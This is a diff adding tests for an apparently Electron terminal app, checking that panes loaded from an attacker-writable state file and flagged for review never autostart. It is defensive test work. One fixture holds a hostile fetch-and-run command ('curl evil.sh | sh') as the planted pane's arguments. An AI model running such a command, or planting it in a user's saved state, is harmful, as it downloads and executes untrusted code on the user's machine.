@@ -328,6 +328,69 @@ describe('serialize', () => {
 })
 
 /**
+ * The autostart gate on the way back in. Main flags every loaded pane whose
+ * command line the profile registry would not vouch for (see issue #59 and
+ * src/main/state-schema.ts); all that is left to the renderer is refusing to
+ * let `autoStartPanes` — a setting read from the same attacker-writable file
+ * as the panes — outrank that flag. A pane held back this way lands on its
+ * Start overlay with the command line in view, and the click is the approval.
+ */
+describe('hydrate', () => {
+  const info = {
+    platform: 'linux' as const,
+    versions: { electron: '43', chrome: '142', node: '22', app: '0.1.0' },
+    homeDir: '/home/u',
+    defaultShell: '/bin/bash',
+    defaultCwd: '/repos/deck'
+  }
+
+  const loaded = (panes: PaneView[], autoStartPanes: boolean): void => {
+    harness.info.mockResolvedValue(info)
+    harness.profiles.list.mockResolvedValue([])
+    harness.loadState.mockResolvedValue({
+      version: 1,
+      activeWorkspaceId: 'one',
+      settings: { ...DEFAULT_SETTINGS, autoStartPanes },
+      workspaces: [workspace('one', panes)]
+    })
+  }
+
+  const paneAt = (id: string): PaneView =>
+    deck()
+      .workspaces.flatMap((w) => w.panes)
+      .find((p) => p.id === id)!
+
+  it('never lets a flagged pane start itself, whatever autoStartPanes says', async () => {
+    loaded(
+      [
+        pane('vouched', 'idle'),
+        pane('planted', 'idle', {
+          command: '/bin/bash',
+          args: ['-c', 'curl evil.sh | sh'],
+          viaShell: true,
+          needsReview: true
+        })
+      ],
+      true
+    )
+
+    await deck().hydrate()
+
+    expect(paneAt('vouched').autostart).toBe(true)
+    expect(paneAt('planted').autostart).toBe(false)
+  })
+
+  /** The flag only ever forces the gate shut — never open. */
+  it('still holds every pane back when the user turned autostart off', async () => {
+    loaded([pane('vouched', 'idle')], false)
+
+    await deck().hydrate()
+
+    expect(paneAt('vouched').autostart).toBe(false)
+  })
+})
+
+/**
  * `saveTimer` and `lastSnapshot` live at module scope, so a timer armed — or a
  * snapshot remembered — by one test would decide the outcome of the next: a
  * test whose deck happened to serialize to the same JSON as its predecessor's
